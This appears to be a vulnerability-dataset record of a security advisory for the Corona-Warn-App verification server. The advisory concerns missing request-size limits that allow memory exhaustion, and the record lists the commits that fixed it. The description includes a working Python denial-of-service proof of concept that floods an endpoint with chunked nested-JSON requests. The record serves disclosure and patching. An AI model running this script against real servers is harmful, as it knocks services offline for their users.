@@ -1,0 +1,35 @@
+<?xml version="1.0" ?>
+<ISSUE>
+  <ISSUENO>55</ISSUENO>
+  <ISSUEURL>https://github.com/corona-warn-app/cwa-verification-server/issues/55</ISSUEURL>
+  <TITLE>[BSI][0.3.1-alpha] Missing request size limitation leads to memory exhaustion</TITLE>
+  <DESCRIPTION>Rating: Medium Description: The server as provided by the Docker file does not limit the request size. This enables an attacker to send arbitrary long requests, that have to be cached by the server in memory. In addition, the server uses stream processing of the supplied JSON data. By repeatedly sending the payload {&quot;&quot;: we can create lots of nested dictionaries, that will be processed by the server. This yields a *10x amplification in memory usage* on the server in comparison to the traffic sent by the attacker. After sending ~164MB, the server CPU usage goes to 100% and the server becomes unresponsive in this configuration. As a single request was used, rate-limiting is not sufficient. Proof of Concept: ```python import socket, sys if len(sys.argv) != 3: print (&quot;usage %s target [size in MB]&quot; % sys.argv[0]) sys.exit(-1) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((sys.argv[1], 8080)) hdr = &quot;POST /version/v1/registrationToken HTTP/1.1\r\n&quot; hdr += &quot;Host: &quot;+sys.argv[1]+&quot;:8080\r\n&quot; hdr += &quot;Content-Type: application/json\r\n&quot; hdr += &quot;Transfer-Encoding: Chunked\r\n&quot; hdr += &quot;\r\n&quot; s.send(hdr) chunk = '{&quot;&quot;:'*256*1024 # we create lots of nested dicts chunk = &quot;%x\r\n%s\r\n&quot; % (len(chunk), chunk) for i in range(int(sys.argv[2])-1): s.send(chunk) sys.stderr.write(&quot;\rSent %d MB&quot; % i) print(&quot;\nDone&quot;) #raw_input() ```</DESCRIPTION>
+  <REPONAME>cwa-verification-server</REPONAME>
+  <TIMEDIFFERENCEDAYS>58</TIMEDIFFERENCEDAYS>
+  <BUGGYCOMMIT>
+    <MESSAGE>Issues/88 (#89) * fixes #88 Adds a nested spring configuration class that reads in values from application.yml. All places where @value annotations were used now use the configuration class. Maybe it makes sense to add comments to the configuration class values, describing their significance? * Adding file header, also adding contributors entry * Fixing checkstyle violation * Removing unused imports</MESSAGE>
+    <SHA>c56f37f783f79e332d61ef248fd00a7ff6d4cee5</SHA>
+  </BUGGYCOMMIT>
+  <PATCHCOMMITS>
+    <COMMIT>
+      <MESSAGE>add a simple filter which prevents BSI issue #55 (Missing request size limitation leads to memory exhaustion)</MESSAGE>
+      <SHA>e253ce8e2b518aae79d9db13ccfb5b21118cd076</SHA>
+      <PATCHEDFILES>
+        <FILE>src/main/java/app/coronawarn/verification/config/PostSizeLimitFilter.java</FILE>
+        <FILE>src/main/resources/application.yml</FILE>
+      </PATCHEDFILES>
+    </COMMIT>
+    <COMMIT>
+      <MESSAGE>feat: added filter for post request size and disabled chunked requests * add a simple filter which prevents BSI issue #55 (Missing request size limitation leads to memory exhaustion) * cleanup * cleanup (sorry) * feat: add a filter which filters large requests and chunked reuqests * *feat: Removed HTTP method filter from PostSizeLimitFilter. PostSizeLimitFilter was changed to RequestSizeLimitFilter. Added check to deny all chunked request independently of their HTTP method. * Manually merged request size filter with master branch * feat: Added BSI's Chunked-Encoding test to test suite Co-authored-by: Maximilian Laue &lt;65015235+mlaue-tech@users.noreply.github.com&gt; Co-authored-by: Felix Dittrich &lt;31076102+f11h@users.noreply.github.com&gt; Co-authored-by: Maximilian Laue &lt;Maximilian.Laue@t-systems.com&gt; Co-authored-by: Felix Dittrich &lt;felix.dittrich@t-systems.com&gt;</MESSAGE>
+      <SHA>9faea012f56478ae54e7fd31427fca16ee1653a1</SHA>
+      <PATCHEDFILES>
+        <FILE>src/main/java/app/coronawarn/verification/config/RequestSizeLimitFilter.java</FILE>
+        <FILE>src/main/java/app/coronawarn/verification/config/VerificationApplicationConfig.java</FILE>
+        <FILE>src/main/resources/application.yml</FILE>
+        <FILE>src/test/java/app/coronawarn/verification/VerificationApplicationExternalTest.java</FILE>
+        <FILE>src/test/java/app/coronawarn/verification/VerificationApplicationExternalTestHttp.java</FILE>
+        <FILE>src/test/java/app/coronawarn/verification/VerificationApplicationTest.java</FILE>
+      </PATCHEDFILES>
+    </COMMIT>
+  </PATCHCOMMITS>
+</ISSUE>
